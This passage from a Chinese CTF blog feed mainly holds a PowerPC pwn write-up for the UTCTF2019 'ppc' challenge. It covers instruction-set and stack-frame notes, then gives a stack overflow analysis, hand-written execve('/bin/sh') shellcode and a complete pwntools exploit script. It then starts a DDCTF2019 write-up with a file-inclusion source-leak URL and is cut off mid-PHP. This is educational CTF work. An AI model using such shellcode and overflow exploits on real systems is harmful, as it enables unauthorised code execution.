class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b ADDRESS</span><br></pre></td></tr></table></figure><p>跳转(或转移)到地址 ADDRESS 处的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bl ADDRESS</span><br></pre></td></tr></table></figure><p>对地址 ADDRESS 的子例程调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmpd REGA, REGB</span><br></pre></td></tr></table></figure><p>比较 REGA 和 REGB 的内容，并恰当地设置状态寄存器的各位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beq ADDRESS</span><br></pre></td></tr></table></figure><p>若之前比较过的寄存器内容等同，则跳转到 ADDRESS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bne, blt, bgt, ble, and bge</span><br></pre></td></tr></table></figure><p>它们均采用相同的形式，但分别检查不等、小于、大于、小于等于和大于等于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std REGA, 0(REGB)</span><br></pre></td></tr></table></figure><p>使用 REGB 的地址作为保存 REGA 的值的内存地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stb, sth, and stw</span><br></pre></td></tr></table></figure><p>它们均采用相同的格式，但分别操作字节、半字和字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc</span><br></pre></td></tr></table></figure><p>对内核进行系统调用</p><p><strong>寄存器表示法</strong><br>所有计算值的指令均以第一个操作数作为目标寄存器。在所有这些指令中，寄存器都仅用数字指定。例如，将数字 12 载入寄存器 5 的指令是<code>li 5,12</code>。5 表示一个寄存器，12 表示数字 12，原因在于指令格式(因为<code>li</code>第一个操作数就是寄存器，第2个是立即数)。在某些指令中，GPR0 只是代表数值 0，而不会去查找 GPR0 的内容。</p><p><strong>立即指令</strong><br>以<code>i</code>结束的指令通常是立即指令。<code>li</code> 表示“立即装入”，它是表示“在编译时获取已知的常量值并将它存储到寄存器中”的一种方法。</p><p><strong>助记符</strong><br><code>li</code>实际上不是一条指令，它真正的含义是助记符。 助记符有点象预处理器宏：它是汇编程序接受的但秘密转换成其它指令的一条指令。上面提到的<code>li 5,12</code> 实际上被定义为<code>addi 5,0,12</code> 。</p><p><strong>指令缩写</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">•st = store</span><br><span class="line">•ld = load</span><br><span class="line">•r = right</span><br><span class="line">•l = left 或者 logical</span><br><span class="line">•h = half word</span><br><span class="line">•w = word</span><br><span class="line">•d = dword</span><br><span class="line">•u = update</span><br><span class="line">•m = move</span><br><span class="line">•f = from 或者 field</span><br><span class="line">•t = to 或者 than</span><br><span class="line">•i = Immediate</span><br><span class="line">•z = zero</span><br><span class="line">•b = branch</span><br><span class="line">•n = and</span><br><span class="line">•s = shift 左移16位</span><br><span class="line">•cmp = compare</span><br><span class="line">•sub = subtract</span><br><span class="line">•clr = clear</span><br><span class="line">•cr = condition register</span><br><span class="line">•lr = link register</span><br><span class="line">•ctr = couter register</span><br></pre></td></tr></table></figure><p>指令集内容比较多，不一一列举，实际使用时，还得多查查手册。</p><h3 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p>栈的概念在PPC等CPU中，不是由CPU实现的，而是由编译器维护的。通常情况下，在PPC中栈顶指针寄存器使用r1，栈底指针寄存器使用r11或r31。或者r11为栈顶，其他为栈底。根据不同的编译选项和编译器环境，其使用方式都有不同，但各个编译器的共识为r1是帧栈指针，其他寄存器都可根据他为准灵活使用。函数的返回值比较简单，在PPC下，函数的返回值只用r3和r4寄存器，不会使用其他寄存器，就像IA32中只使用eax和edx寄存器一样。</p><p>PowerPC寄存器没有专用的Pop，Push指令来执行堆栈操作，所以PowerPC构架使用存储器访问指令stwu，lwzu来代替Push和Pop指令。PowerPC处理器使用GPR1来将这个堆栈段构成一个单向链表，这个单链表的每一个数据成员，我们称之为堆栈帧（Stack Frame），每一个函数负责维护自己的堆栈帧。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190427110839-c18ec872-6899-1.png" alt=""></p><p><strong>函数参数域（Function Parameter Area）：</strong>这个区域的大小是可选的，即如果如果调用函数传递给被调用函数的参数少于六个时，用GPR4至GPR10这个六个寄存器就可以了，被调用函数的栈帧中就不需要这个区域；但如果传递的参数多于六个时就需要这个区域。</p><p><strong>局部变量域（Local Variables Area）：</strong>通上所示，如果临时寄存器的数量不足以提供给被调用函数的临时变量使用时，就会使用这个域。</p><p><strong>CR寄存器：</strong>即使修改了CR寄存器的某一个段CRx（x=0至7），都有保存这个CR寄存器的内容。</p><p><strong>通用寄存器GPR：</strong>当需要保存GPR寄存器中的一个寄存器器GPRn时，就需要把从GPRn到GPR31的值都保存到堆栈帧中。</p><p><strong>浮点寄存器FPR：</strong>使用规则共GPR寄存器。</p><p>每个Ｃ函数开始几行汇编会为自己建立堆栈帧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mflr %r0                ;Get Link register</span><br><span class="line">stwu %r1,-88(%r1)       ;Save Back chain and move SP(r1) = r1 – 88</span><br><span class="line">stw %r0,+92(%r1)        ;Save Link register</span><br><span class="line">stmw %r28,+72(%r1)      ;Save 4 non-volatiles r28-r31</span><br></pre></td></tr></table></figure></p><p>C函数的结尾几行，会移除建立的堆栈帧，并使得SP（即GPR1）寄存器指向上一个栈帧的栈顶(即栈帧的最低地址处，也就是back chain)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lwz %r0,+92(%r1)       ;Get saved Link register</span><br><span class="line">mtlr %r0               ;Restore Link register</span><br><span class="line">lmw %r28,+72(%r1)      ;Restore non-volatiles</span><br><span class="line">addi %r1,%r1,88        ;Remove sp frame from stack r1 = r1 + 88</span><br><span class="line">blr                    ;Return to calling function</span><br></pre></td></tr></table></figure></p><h2 id="实战-UTCTF2019-PPC"><a href="#实战-UTCTF2019-PPC" class="headerlink" title="实战 UTCTF2019 PPC"></a>实战 UTCTF2019 PPC</h2><p>例牌检查一下ELF文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/utctf/ppc&apos;</span><br><span class="line">    Arch:     powerpc64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x10000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>ida7.0没有PowerPC的反汇编功能，直接看汇编还是有点吃力，可以试一下前段时间发布的Ghidra。搜索main函数，可以看到Ghidra的反汇编功能非常强大。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> sVar1;</span><br><span class="line">  <span class="keyword">size_t</span> __edflag;</span><br><span class="line">  <span class="keyword">int</span> local_20;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* local function entry for global function main at 10000a78 */</span></span><br><span class="line">  welcome();</span><br><span class="line">  get_input();</span><br><span class="line">  sVar1 = .<span class="built_in">strlen</span>(buf);</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_20 &lt; (<span class="keyword">int</span>)sVar1) &#123;</span><br><span class="line">    buf[(longlong)local_20] = buf[(longlong)local_20] ^ <span class="number">0xcb</span>;</span><br><span class="line">    local_20 = local_20 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __edflag = sVar1;</span><br><span class="line">  __printf(&amp;DAT_1009ed68);</span><br><span class="line">  .encrypt((<span class="keyword">char</span> *)(longlong)(<span class="keyword">int</span>)sVar1,__edflag);</span><br><span class="line">  .<span class="built_in">puts</span>(<span class="string">"Exiting.."</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  .<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_input</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                    <span class="comment">/* local function entry for global function get_input at 10000c8c */</span></span><br><span class="line">  .<span class="built_in">puts</span>(<span class="string">"Enter a string"</span>);</span><br><span class="line">  .fgets(buf,<span class="number">1000</span>,(FILE *)<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get_input()</code>函数通过fgets读入1000字节到<code>buf</code>，然后用<code>strlen</code>计算输入字符的长度，然后输入内容跟<code>0xcb</code>异或。目前为止，并没有什么漏洞，真正出问题的地方在<code>encrypt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> .encrypt(<span class="keyword">char</span> *__block,<span class="keyword">int</span> __edflag)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> local_90;</span><br><span class="line">  byte abStack136 [<span class="number">104</span>];</span><br><span class="line">  undefined4 local_20;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* local function entry for global function encrypt at 10000bb4 */</span></span><br><span class="line">  local_20 = SUB84(__block,<span class="number">0</span>);</span><br><span class="line">  .<span class="built_in">memcpy</span>(abStack136,buf,<span class="number">1000</span>);</span><br><span class="line">  __printf(<span class="string">"Here\'s your string: "</span>);</span><br><span class="line">  local_90 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_90 &lt; <span class="number">0x32</span>) &#123;</span><br><span class="line">    __printf(&amp;DAT_1009edf8,(longlong)(<span class="keyword">int</span>)(uint)abStack136[(longlong)local_90]);</span><br><span class="line">    local_90 = local_90 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  .<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数会将<code>buf</code>的内容通过<code>memcpy</code>复制到栈上，而<code>abStack136</code>只有104字节，很明显存在一个栈溢出漏洞。由于程序什么保护都没开，最简单的利用方法给x86的思路差不多，栈溢出覆盖返回地址，跳到可控内存段执行shellcode。程序对输入内容进行异或，处理方法有两个：1、将payload先进行一次异或再发送；2、<code>strlen</code>能够被<code>\x00</code>截断，截断后的内容不会经过异或。</p><ul><li>栈溢出第一步，先确定溢出长度</li></ul><p>静态分析汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000010000BBC .set sender_lr,  0x10</span><br><span class="line">...</span><br><span class="line">.text:0000000010000BDC                 addi      r10, r2, (buf_0 - 0x100D7D00)</span><br><span class="line">.text:0000000010000BE0                 addi      r9, r31, 0x68  ; abStack136</span><br><span class="line">.text:0000000010000BE4                 mr        r8, r10</span><br><span class="line">.text:0000000010000BE8                 li        r10, 0x3E8</span><br><span class="line">.text:0000000010000BEC                 mr        r5, r10</span><br><span class="line">.text:0000000010000BF0                 mr        r4, r8</span><br><span class="line">.text:0000000010000BF4                 mr        r3, r9</span><br><span class="line">.text:0000000010000BF8                 bl        memcpy_0</span><br><span class="line">...</span><br><span class="line">.text:0000000010000C6C                 addi      r1, r31, 0xF0</span><br><span class="line">.text:0000000010000C70                 ld        r0, sender_lr(r1)</span><br><span class="line">.text:0000000010000C74                 mtlr      r0</span><br><span class="line">.text:0000000010000C78                 ld        r31, var_8(r1)</span><br><span class="line">.text:0000000010000C7C                 blr</span><br></pre></td></tr></table></figure></p><p>首先看到<code>memcpy(abStack136,buf,1000)</code>对应的汇编，<code>r3</code>为参数一的<code>abStack136</code>，往上跟，不难发现<code>abStack136</code>在<code>r31+0x68</code>的位置。再看到函数结束前恢复<code>LR</code>的汇编码，<code>r0</code>为储存<code>LR</code>的位置，为<code>r31+0xf0+0x10</code>。</p><p>用gdb动态调试，也可以分析出一样的结果。跟arm,mips类似，使用qemu进行调试。直接在encrypt结束处下一个断点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   0x10000c6c &lt;encrypt+184&gt;    addi   r1, r31, 0xf0</span><br><span class="line">   0x10000c70 &lt;encrypt+188&gt;    ld     r0, 0x10(r1)</span><br><span class="line">►  0x10000c74 &lt;encrypt+192&gt;    mtlr   r0</span><br><span class="line">   0x10000c78 &lt;encrypt+196&gt;    ld     r31, -8(r1)</span><br><span class="line">   0x10000c7c &lt;encrypt+200&gt;    blr</span><br></pre></td></tr></table></figure><p>同时查看栈，查找我们输入的一大串’0xaaaaaaaaaa’<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r31 sp  <span class="number">0</span>x40007fff50 —▸ <span class="number">0</span>x4000800040 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0</span>x40007fff58 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0</span>x40007fff60 —▸ <span class="number">0</span>x10000c64 (encrypt+<span class="number">176</span>) ◂— nop</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0</span>x40007fff68 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0</span>x40007fff70 ◂— <span class="number">0</span>x1c</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0</span>x40007fff78 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0</span>x40007fff80 ◂— <span class="number">0</span>x1</span><br><span class="line">07:0038│         0x40007fff88 ◂— 0x20 /* ' ' */</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│         <span class="number">0</span>x40007fff90 —▸ <span class="number">0</span>x1009edfb ◂— <span class="number">0</span>x746e450000000000</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│         <span class="number">0</span>x40007fff98 ◂— <span class="number">0</span>x0</span><br><span class="line">... ↓</span><br><span class="line">0b:0058│         0x40007fffa8 —▸ 0x40007fffb0 ◂— 0x32 /* '2' */</span><br><span class="line">0c:0060│         0x40007fffb0 ◂— 0x32 /* '2' */</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│         <span class="number">0</span>x40007fffb8 ◂— <span class="number">0</span>xaaaaaaaaaaaaaaaa  # 输入的内容</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│         <span class="number">0</span>x40007fffd0 ◂— <span class="number">0</span>xc1aaaaaa</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│         <span class="number">0</span>x40007fffd8 ◂— <span class="number">0</span>x0</span><br></pre></td></tr></table></figure></p><p>那么<code>LR</code>的偏移为<code>0xf0+0x10-0x68=152</code>，只要填充152字节就可以覆盖<code>LR</code>。</p><p>当然，也可以用最粗暴的报错方法进行爆破溢出长度，原理跟x86的类似，输入一串超长的字符串，通过报错时观察<code>LR</code>的值，确定溢出长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kira @ k1r4 <span class="keyword">in</span> ~/pwn/utctf on git:master x [9:22:41]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python -c <span class="string">"print ('a'*152)"</span>|./ppc</span></span><br><span class="line">This is the UT encryption service.</span><br><span class="line">We take your strings and make them into other strings!</span><br><span class="line">Enter a string</span><br><span class="line">153</span><br><span class="line">Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa</span><br><span class="line">Invalid data memory access: 0x00000000000000c0</span><br><span class="line">NIP 00000000000000c0   LR 00000000000000c1 CTR 0000000010014870 XER 0000000020000000 CPU#0</span><br><span class="line">MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> kira @ k1r4 <span class="keyword">in</span> ~/pwn/utctf on git:master x [9:22:58] C:139</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python -c <span class="string">"print ('a'*160)"</span>|./ppc</span></span><br><span class="line">This is the UT encryption service.</span><br><span class="line">We take your strings and make them into other strings!</span><br><span class="line">Enter a string</span><br><span class="line">161</span><br><span class="line">Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa</span><br><span class="line">Invalid data memory access: 0x0000000000000000</span><br><span class="line">NIP aaaaaaaaaaaaaaa8   LR aaaaaaaaaaaaaaaa CTR 0000000010014870 XER 0000000020000000 CPU#0</span><br><span class="line">MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0</span><br></pre></td></tr></table></figure><p>留意<code>LR</code>的报错信息，当输入长度152时（请无视那个换行符），<code>LR</code>未被覆盖，而输入长度160时，<code>LR</code>已经被我们输入覆盖了。那么可以确定溢出长度为152。</p><ul><li>下一步，我们需要寻找一个可控的内存段存放shellcode，而且地址必须可知。</li></ul><p>这一步没花太多时间，因为在程序唯一一次读取输入的地方，可以发现存放输入的<code>buf</code>是一个bss段的全局变量，程序没开PIE，地址可知。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000100D2B40                 .globl buf_0</span><br><span class="line">.bss:00000000100D2B40 buf_0:          .space 1                # DATA XREF: main_0+20↑o</span><br><span class="line">.bss:00000000100D2B40                                         # main_0+44↑o ...</span><br></pre></td></tr></table></figure></p><ul><li>现在可以开始进行shellcode编写</li></ul><p>ppc的shellcode跟x86没什么差别，最终目标一样是<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>，构造条件如下：</p><ol><li><code>r0</code>为syscall调用号，需要设为<code>0xb</code></li><li><code>r3</code>为参数一，需要指向<code>/bin/sh</code></li><li><code>r4</code>为参数二，需清0</li><li><code>r5</code>为参数三，需清0</li><li>在ppc中syscall使用<code>sc</code></li></ol><p>shellcode编写需要上面提到的各种指令集，不停查阅后终于写出shellcode，最终写出的shellcode如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor 3,3,3</span><br><span class="line">lis 3, 0x100d</span><br><span class="line">addi 3, 3, 0x2b64</span><br><span class="line">xor 4,4,4</span><br><span class="line">xor 5,5,5</span><br><span class="line">li 0, 11</span><br><span class="line">sc</span><br><span class="line">.long 0x6e69622f</span><br><span class="line">.long 0x68732f</span><br></pre></td></tr></table></figure></p><p>为了绕过异或，我直接在payload前面加了8字节的\x00，因此后面用的各种地址都需要+8。</p><p>完整exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">target = <span class="string">'ppc'</span></span><br><span class="line">p = process(<span class="string">'./'</span>+target)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">"""</span></span><br><span class="line"><span class="string">xor 3,3,3   </span></span><br><span class="line"><span class="string">lis 3, 0x100d  </span></span><br><span class="line"><span class="string">addi 3, 3, 0x2b64</span></span><br><span class="line"><span class="string">xor 4,4,4</span></span><br><span class="line"><span class="string">xor 5,5,5</span></span><br><span class="line"><span class="string">li 0, 11</span></span><br><span class="line"><span class="string">sc</span></span><br><span class="line"><span class="string">.long 0x6e69622f</span></span><br><span class="line"><span class="string">.long 0x68732f</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>) + shellcode</span><br><span class="line">rop = rop.ljust(<span class="number">152</span>,<span class="string">'A'</span>)</span><br><span class="line">rop += p64(<span class="number">0x100D2B40</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'string\n'</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190427111512-abc4791e-689a-1.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然是最简单的栈溢出+shellcode编写，不过由于PowerPC接触太少，还是花了好多时间进行资料收集和研究，最终做出来也对PowerPC熟悉了不少。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ibm.com/developerworks/cn/linux/l-powarch/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-powarch/index.html</a></p><p><a href="https://example61560.wordpress.com/2016/07/14/powerpc%E6%9E%84%E6%9E%B6%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8E%A5%E5%8F%A3%EF%BC%88abi%EF%BC%89%E5%8F%8A%E5%A0%86%E6%A0%88%E5%B8%A7%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">https://example61560.wordpress.com/2016/07/14/powerpc%E6%9E%84%E6%9E%B6%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8E%A5%E5%8F%A3%EF%BC%88abi%EF%BC%89%E5%8F%8A%E5%A0%86%E6%A0%88%E5%B8%A7%E8%AF%A6%E8%A7%A3/</a></p><p><a href="http://math-atlas.sourceforge.net/devel/assembly/ppc_isa.pdf" target="_blank" rel="noopener">http://math-atlas.sourceforge.net/devel/assembly/ppc_isa.pdf</a></p><p><a href="https://bbs.pediy.com/thread-191928.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-191928.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知论坛 &lt;a href=&quot;https://xz.aliyun.com/t/4975&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4975&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;PowerPC&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ddctf2019-misc&amp;web&amp;re-writeup</title>
    <link href="https://4f-kira.github.io/2019/06/08/ddctf2019/"/>
    <id>https://4f-kira.github.io/2019/06/08/ddctf2019/</id>
    <published>2019-06-08T09:38:16.000Z</published>
    <updated>2019-06-08T09:39:39.903Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知论坛 <a href="https://xz.aliyun.com/t/4887" target="_blank" rel="noopener">https://xz.aliyun.com/t/4887</a></p><h1 id="DDCTF2019"><a href="#DDCTF2019" class="headerlink" title="DDCTF2019"></a>DDCTF2019</h1><p>刚刚结束的ddctf2019，题目质量还是不错的，当然脑洞也不小，也有出题人不谨慎而导致非预期解，下面也会提及。共计23题，完成17题，Android一道没做，re、misc、web都差最后一题，待其他大神发writeup了。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>访问自动跳转到 <a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a> ，页面上显示flag.jpg<br>对<code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 分析可知为<code>base64_encode(base64_encode(&#39;flag.jpg&#39;.encode(&#39;hex&#39;))</code></p><p>文件包含泄露源码：<code>http://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>，<code>index.php</code>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 